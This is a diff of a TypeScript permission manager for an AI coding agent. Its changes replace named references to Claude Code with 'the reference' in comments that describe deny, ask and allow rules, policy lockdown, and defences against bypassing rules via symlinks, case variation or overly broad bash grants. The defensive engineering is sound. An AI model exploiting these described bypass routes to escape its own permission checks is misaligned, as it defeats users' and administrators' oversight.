-   * blanket-approve bash. Mirrors Claude's `findOverlyBroadBashPermissions`
+   * blanket-approve bash. Mirrors the reference's `findOverlyBroadBashPermissions`
    * (utils/permissions/permissionSetup.ts L378-412). Uses the single canonical
    * {@link isOverlyBroadBashAllowRule} detector (shared with cli config-resolver).
    */
@@ -8547,7 +8547,7 @@ export class PermissionManager {
    * allow it carries must never silently grant the whole team YOLO bash auto-approval
    * — a hostile project rule of that breadth should not exist at all. Personal tiers
    * (user/local/cliArg/session) and an untagged rule are the user's own explicit
-   * grant and are left intact. Returns the newly stripped rules. Parity: Claude's
+   * grant and are left intact. Returns the newly stripped rules. Parity: the reference's
    * `removeDangerousPermissions(findOverlyBroadBashPermissions(...))` re-run after a
    * settings sync (utils/settings/applySettingsChange.ts L50-59).
    */
@@ -8633,7 +8633,7 @@ export class PermissionManager {
    * name the SAME file, so a deny rule written in one casing must still block the
    * other — otherwise the deny is bypassable by a trivial case variation. No-op on a
    * case-sensitive FS (Linux) and for non-path tools (bash/grep are case-sensitive).
-   * Mirrors Claude's `matchWildcardPattern(..., caseInsensitive)` usage.
+   * Mirrors the reference's `matchWildcardPattern(..., caseInsensitive)` usage.
    */
   private pathRuleCaseInsensitive(toolName: string): boolean {
     return FILE_PATH_RULE_TOOLS.has(normalizeToolName(toolName)) && isCaseInsensitiveFs();
@@ -8647,7 +8647,7 @@ export class PermissionManager {
    * a `file_read(/etc/**)` deny rule even though the literal argument is `./link`.
    * For a non-file tool (or when no file path is present) this is just the single
    * canonical input string, so bash/other rule matching is unchanged. Mirrors
-   * Claude's getPathsForPermissionCheck threaded through deny/ask rule matching
+   * the reference's getPathsForPermissionCheck threaded through deny/ask rule matching
    * (utils/permissions/filesystem.ts L1081-1101).
    */
   private fileRuleMatchStrings(toolName: string, input: Record<string, unknown>): string[] {
@@ -8670,7 +8670,7 @@ export class PermissionManager {
    * ABSOLUTE candidate path (and every symlink hop, so a rooted deny/ask/allow rule
    * cannot be bypassed via an in-workspace symlink). Returns `false` for bash/non-file
    * tools, content-less rules, or root-agnostic patterns (the existing raw matcher
-   * already handles those unchanged). Mirrors Claude's `matchingRuleForInput`
+   * already handles those unchanged). Mirrors the reference's `matchingRuleForInput`
    * (utils/permissions/filesystem.ts L955) per-root resolution step.
    */
   private matchFilePathRuleWithRoot(
@@ -8714,7 +8714,7 @@ export class PermissionManager {
   }
 
   /**
-   * Edit-access-implies-read (parity: Claude's filesystem.ts L1127-1134 "if you can
+   * Edit-access-implies-read (parity: the reference's filesystem.ts L1127-1134 "if you can
    * edit it you can read it"): a path the user granted EDIT access to via a `file_edit`
    * ALLOW rule is READABLE too, even when it is OUTSIDE the launch workspace — so a
    * user who added `file_edit(/data/out/**)` does not ALSO need a separate
@@ -8736,7 +8736,7 @@ export class PermissionManager {
    * Does any user-configured `ask` rule match this tool+input? Mirrors
    * {@link anyDenyMatches} but for content-specific `ask` rules. Used to keep
    * explicit `ask` rules BYPASS-IMMUNE: a user's `{tool, action:'ask'}` rule must
-   * still prompt in bypassPermissions mode, before the blanket auto-allow (Claude
+   * still prompt in bypassPermissions mode, before the blanket auto-allow (the reference
    * evaluates ask/safety-check rules BEFORE the bypass allow, permissions.ts
    * L1169-1281).
    */
@@ -8772,7 +8772,7 @@ export class PermissionManager {
    * prompted, not auto-allowed). Intended to be called AFTER {@link check} /
    * {@link checkWithReason} already returned `allow`, so the executor can attribute the
    * silent approval to the specific standing rule that caused it — the provenance surface
-   * Claude Code shows as `Auto-approved · matched "<rule>"` (classifierMatchedRule /
+   * the reference shows as `Auto-approved · matched "<rule>"` (classifierMatchedRule /
    * setClassifierApproval). The label uses the canonical `Tool(pattern)` permission-rule
    * syntax (or the bare tool name for a tool-wide rule). Pure read — never prompts or
    * mutates state.
@@ -8798,7 +8798,7 @@ export class PermissionManager {
 
   /**
    * Synchronously decide whether a bash COMMAND would be DENIED by the user's
-   * configured deny rules (parity with Claude Code's `hasPermissionsToUseTool`
+   * configured deny rules (parity with the reference's `hasPermissionsToUseTool`
    * deny half, applied to skill/command-embedded `!`cmd` live-command execution —
    * promptShellExecution.ts). It reuses the SAME canonical bash deny-matching that
    * {@link check} uses ({@link anyDenyMatches} → `matchBashPattern`: compound-command
@@ -8837,7 +8837,7 @@ export class PermissionManager {
    * Managed (`policySettings`) rules are IMMUTABLE: they are admin/enterprise-owned
    * and can never be removed by the agent, a persona-scope cleanup, or a
    * `/permissions remove` — even when the predicate matches them. This mirrors
-   * Claude's managed-settings tier, where policy rules are read-only to the user
+   * the reference's managed-settings tier, where policy rules are read-only to the user
    * ({@link isManagedPermissionSource}). The lockdown in {@link addRule} stops new
    * non-managed rules from being added; this stops existing managed rules from
    * being deleted, so the enterprise policy floor cannot be edited away at runtime.
@@ -8846,7 +8846,7 @@ export class PermissionManager {
     const before = this.rules.length;
     this.rules = this.rules.filter(r => isManagedPermissionSource(r.source) || !predicate(r));
     const removed = before - this.rules.length;
-    // Trace only when a rule was actually dropped, mirroring Claude's "Removing N
+    // Trace only when a rule was actually dropped, mirroring the reference's "Removing N
     // rule(s)" trace.
     if (removed > 0) {
       this.traceMutation(`Removing ${removed} rule(s)`);
@@ -8861,7 +8861,7 @@ export class PermissionManager {
    * single canonical path for turning a declarative rule/mode/directory mutation
    * (a permission-prompt suggestion, a `/permissions allow|deny|remove` command, a
    * hook-returned update) into state, so callers never hand-roll the addRule /
-   * removeRule / setMode / registerAllowedRoot plumbing. Mirrors Claude's
+   * removeRule / setMode / registerAllowedRoot plumbing. Mirrors the reference's
    * `applyPermissionUpdate`; purely in-memory (persistence is a separate step).
    * Returns the number of rules/directories affected. Rule removal matches on the
    * NORMALIZED canonical string (parse→serialize) so a `Bash(*)` suggestion
@@ -8896,7 +8896,7 @@ export class PermissionManager {
       case 'replaceRules': {
         const source = update.destination as PermissionRuleSource | undefined;
         // Atomically clear every rule of this (behavior, destination) first, then
-        // add the replacements — mirrors Claude's per-(behavior,destination) swap.
+        // add the replacements — mirrors the reference's per-(behavior,destination) swap.
         this.removeRule(r => r.action === update.behavior && r.source === source);
         return this.applyUpdate({ type: 'addRules', rules: update.rules, behavior: update.behavior, destination: update.destination });
       }
@@ -8933,7 +8933,7 @@ export class PermissionManager {
 
   /**
    * Apply a BATCH of {@link PermissionUpdate}s in order (the one-click
-   * "accept all suggestions" affordance). Mirrors Claude's
+   * "accept all suggestions" affordance). Mirrors the reference's
    * `applyPermissionUpdates`. Returns the total number of rules/directories
    * affected across every update.
    */
@@ -8950,7 +8950,7 @@ export class PermissionManager {
    * {@link applyUpdate}, then drop those entries from the log so they are not
    * offered again. Returns the retried commands and the model-facing
    * {@link createPermissionRetryMessage} so the caller can tell the agent it may
-   * re-attempt them. Mirrors Claude's `/permissions` "retry denials" affordance
+   * re-attempt them. Mirrors the reference's `/permissions` "retry denials" affordance
    * (onRetryDenials → createPermissionRetryMessage), extended to actually seed the
    * allow rule so the retry succeeds instead of prompting again.
    */
@@ -8979,19 +8979,19 @@ export class PermissionManager {
    * take effect, each with a {@link ShadowType}, a human-readable {@link
    * UnreachableRule.reason}, and an actionable {@link UnreachableRule.fix}.
    *
-   * Severity ordering (parity with Claude's detectUnreachableRules): deny-shadowing
+   * Severity ordering (parity with the reference's detectUnreachableRules): deny-shadowing
    * is checked FIRST and, on a hit, the allow is reported ONCE as `deny` and ask
    * shadowing is NOT also reported — each unreachable allow yields exactly one
    * finding, the most severe. A tool-wide deny is order-independent (a matching deny
    * unconditionally wins in {@link check}); a tool-wide ask only shadows when it
    * PRECEDES the allow, because an ask AFTER the allow never fires (AMI evaluates in
-   * rule order — this is an intentional superset-accurate divergence from Claude's
+   * rule order — this is an intentional superset-accurate divergence from the reference's
    * order-agnostic ask scan, matching AMI's real evaluation).
    *
    * Sandbox carve-out: when sandbox auto-allow is active (from `options` or the
    * manager's own sandbox policy), a tool-wide Bash ask rule from PERSONAL settings
    * is not reported as shadowing — sandboxed bash is auto-allowed for this user — but
-   * a shared-source ask rule still warns. Mirrors Claude's
+   * a shared-source ask rule still warns. Mirrors the reference's
    * `isAllowRuleShadowedByAskRule` exception.
    */
   detectShadowedRules(options: DetectUnreachableRulesOptions = {}): UnreachableRule[] {
@@ -9006,7 +9006,7 @@ export class PermissionManager {
       // unreachable. A TOOL-WIDE allow (no pattern, or `*`) merely CONFLICTS with
       // a tool-wide deny/ask — it is not reported as shadowed, else every bare
       // `{tool, action:'allow'}` under a tool-wide deny is a false positive.
-      // Mirrors Claude's shadowedRuleDetection (ruleContent === undefined ⇒ not
+      // Mirrors the reference's shadowedRuleDetection (ruleContent === undefined ⇒ not
       // shadowed, shadowedRuleDetection.ts L118-122 / L166-170).
       const allowSpecific = !!allow.pattern && allow.pattern !== '*';
       if (!allowSpecific) continue;
@@ -9063,7 +9063,7 @@ export class PermissionManager {
   // Managed / enterprise policy (policySettings tier)
   // -------------------------------------------------------------------------
 
-  /** Is the managed-rules-only lockdown active (Claude's
+  /** Is the managed-rules-only lockdown active (the reference's
    *  `allowManagedPermissionRulesOnly`)? When true, only `policySettings` rules are
    *  honored and nothing may be persisted. Set by {@link loadManagedPermissions}. */
   isManagedRulesOnly(): boolean {
@@ -9072,7 +9072,7 @@ export class PermissionManager {
 
   /** Should a permission prompt offer "always allow" / "don't ask again" options?
    *  No, under the managed-rules-only lockdown — new rules can't be persisted, so a
-   *  durable-allow affordance would be a dead end. Mirrors Claude's
+   *  durable-allow affordance would be a dead end. Mirrors the reference's
    *  `shouldShowAlwaysAllowOptions()`. */
   shouldShowAlwaysAllowOptions(): boolean {
     return !this._managedRulesOnly;
@@ -9084,7 +9084,7 @@ export class PermissionManager {
    * boolean, rules: [...] }`. Every rule is tagged `policySettings` and loaded at
    * HIGHEST precedence (prepended). When `allowManagedPermissionRulesOnly` is true,
    * the lockdown engages: all non-`policySettings` rules already loaded are cleared
-   * and no other tier is consulted — mirrors Claude's
+   * and no other tier is consulted — mirrors the reference's
    * `loadAllPermissionRulesFromDisk` / `syncPermissionRulesFromDisk` managed path.
    * Returns collected warnings. A missing file is a no-op.
    */
@@ -9139,7 +9139,7 @@ export class PermissionManager {
 
       // Preserve any unrecognized top-level keys (hooks, env, or a future AMI field)
       // so a round-trip through saveRules doesn't silently destroy settings this
-      // loader doesn't model. Mirrors Claude's `...settingsData` spread-on-write.
+      // loader doesn't model. Mirrors the reference's `...settingsData` spread-on-write.
       if (data && typeof data === 'object' && !Array.isArray(data)) {
         for (const k of Object.keys(data)) {
           if (k !== 'mode' && k !== 'rules' && k !== 'additionalDirectories') {
@@ -9148,7 +9148,7 @@ export class PermissionManager {
         }
       }
 
-      // Load persisted additional read directories (parity: Claude's
+      // Load persisted additional read directories (parity: the reference's
       // `permissions.additionalDirectories`) as real read-root grants tagged with
       // the project tier, so a committed `.ami/permissions.json` that lists extra
       // directories actually grants the agent read access to them on launch (and
@@ -9242,7 +9242,7 @@ export class PermissionManager {
    * precedence: most-specific first so check()'s first-match allow/ask wins for
    * localSettings over projectSettings over userSettings (deny stays
    * order-independent). Each loaded rule is tagged with its `source` tier. Returns
-   * collected warnings. Mirrors Claude's destination-tiered rule merge.
+   * collected warnings. Mirrors the reference's destination-tiered rule merge.
    */
   loadTieredRules(cwd: string): string[] {
     const warnings: string[] = [];
@@ -9257,7 +9257,7 @@ export class PermissionManager {
     // Re-derive the `useAutoModeDuringPlan` preference fresh from disk on every (re)load
     // so a mid-session settings edit toggling it is picked up by the following
     // transitionPlanAutoMode reconciliation. Highest-precedence (first-defined) tier
-    // wins — a local override beats project beats user. Parity: Claude's
+    // wins — a local override beats project beats user. Parity: the reference's
     // getUseAutoModeDuringPlan() reading merged settings.
     this._useAutoModeDuringPlan = false;
     let autoModeDuringPlanResolved = false;
@@ -9285,7 +9285,7 @@ export class PermissionManager {
     // Re-screen the merged tiers for dangerous breadth so a disk edit (a committed
     // project file, a settings-change re-sync via syncRulesFromDisk) cannot silently
     // (re-)grant a blanket `Bash` / `Bash(*)` allow into the live context. Mirrors
-    // Claude's applySettingsChange re-running removeDangerousPermissions after every
+    // the reference's applySettingsChange re-running removeDangerousPermissions after every
     // disk sync (applySettingsChange.ts L50-59).
     for (const r of this.stripOverlyBroadBashAllowRules()) {
       warnings.push(`Stripped overly-broad bash allow rule from untrusted settings: ${describeRule(r)}`);
@@ -9295,7 +9295,7 @@ export class PermissionManager {
 
   /**
    * Re-sync the live rule set from disk after an on-disk settings change, mirroring
-   * Claude Code's `loadAllPermissionRulesFromDisk` + `syncPermissionRulesFromDisk`
+   * the reference's `loadAllPermissionRulesFromDisk` + `syncPermissionRulesFromDisk`
    * (applySettingsChange.ts L37-48): drop every rule that ORIGINATED from a persisted
    * tier (`policySettings`/`localSettings`/`projectSettings`/`userSettings`), reset
    * the managed-rules-only lockdown so a removed policy file no longer locks down,
@@ -9322,7 +9322,7 @@ export class PermissionManager {
     // Reconcile plan/auto-mode state against the just-reloaded settings: a mid-plan
     // toggle of `useAutoModeDuringPlan` strips/restores dangerous rules and flips the
     // realized auto state immediately, and a still-active auto mode re-strips the disk
-    // rules that the reload re-added. Parity: Claude's applySettingsChange running
+    // rules that the reload re-added. Parity: the reference's applySettingsChange running
     // transitionPlanAutoMode(newContext) after syncPermissionRulesFromDisk
     // (applySettingsChange.ts:L68).
     this.transitionPlanAutoMode();
@@ -9347,13 +9347,13 @@ export class PermissionManager {
       // via the ONE canonical atomic writer — a crash / ENOSPC mid-write can never
       // leave a truncated permissions file that loadRules then silently discards,
       // and the file (which can hold deny patterns describing the project) is not
-      // world-readable. Mirrors Claude's writeFileSyncAndFlush_DEPRECATED + 0o600.
+      // world-readable. Mirrors the reference's writeFileSyncAndFlush_DEPRECATED + 0o600.
       atomicWriteFileSync(filePath, JSON.stringify({ rules }, null, 2) + '\n', { mode: OWNER_ONLY_FILE_MODE });
       this.traceMutation(`Persisting ${rules.length} rule(s) to destination '${destination}': ${filePath}`);
       // The project-LOCAL destination is advertised to the user as "gitignored —
       // not shared with collaborators" (permission-save-destinations.ts). Make good
       // on that promise by actually adding the local file to the global gitignore,
-      // exactly as Claude Code does on a `localSettings` write (settings.ts L508-514).
+      // exactly as the reference does on a `localSettings` write (settings.ts L508-514).
       // Best-effort + swallowed inside the helper: a gitignore write must never turn
       // a successful rule-persist into a failure.
       if (destination === 'localSettings') {
@@ -9370,7 +9370,7 @@ export class PermissionManager {
    * Persist the current rules to `.ami/permissions.json`. Returns a success/error
    * signal so callers can surface a write failure instead of silently losing a
    * "don't ask again" rule (a read-only `.ami/`, a full disk, or a permission
-   * error must not look like success). Mirrors Claude's addPermissionRulesToSettings
+   * error must not look like success). Mirrors the reference's addPermissionRulesToSettings
    * try/catch + boolean-return behavior (permissionsLoader.ts L258-295).
    */
   saveRules(cwd: string): { ok: boolean; error?: string } {
@@ -9381,7 +9381,7 @@ export class PermissionManager {
       const filePath = path.join(cwd, '.ami', 'permissions.json');
       // Spread preserved unknown keys FIRST so the canonical mode/rules always win,
       // while a user's (or a future version's) extra keys survive the round-trip.
-      // Persist the source-tracked additional read directories (parity: Claude's
+      // Persist the source-tracked additional read directories (parity: the reference's
       // `permissions.additionalDirectories`): only the PERSISTABLE tiers are written
       // — an ephemeral `session`/`cliArg` grant (`/add-dir`, `--context-file`) stays
       // in-memory and is dropped on exit, exactly as before. De-duped + order-stable.
